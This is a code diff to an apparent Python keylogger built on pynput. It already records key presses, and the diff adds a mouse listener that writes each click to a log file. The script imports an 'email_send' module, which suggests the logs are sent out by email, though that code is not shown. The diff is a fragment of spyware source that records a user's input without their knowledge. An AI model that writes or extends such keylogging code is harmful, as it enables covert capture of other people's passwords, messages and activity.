@@ -1,6 +1,5 @@
 import os 
 import pynput 
-from pynput.keyboard import Key, Listener 
 import data
 import threading
 import email_send
@@ -30,7 +29,20 @@ def OnKeyPress(key):
 def OnKeyRelease(key):
 	pass
 
-with Listener(on_press = OnKeyPress, 
-              on_release = OnKeyRelease) as listener: 
-                      
-    listener.join() 
+def OnMouseClick(x, y, button, pressed):
+	if pressed:
+		with open(log_file, 'a') as f: 
+			f.write(f"Click\n")
+
+def OnScroll(x,y,dx,dy):
+	pass
+
+def OnMove(x,y):
+	pass
+
+with pynput.mouse.Listener(on_move=OnMove, on_click=OnMouseClick, on_scroll=OnScroll) as listener:
+	with pynput.keyboard.Listener(on_press = OnKeyPress, 
+			  on_release = OnKeyRelease) as listener: 
+		listener.join()
+
+
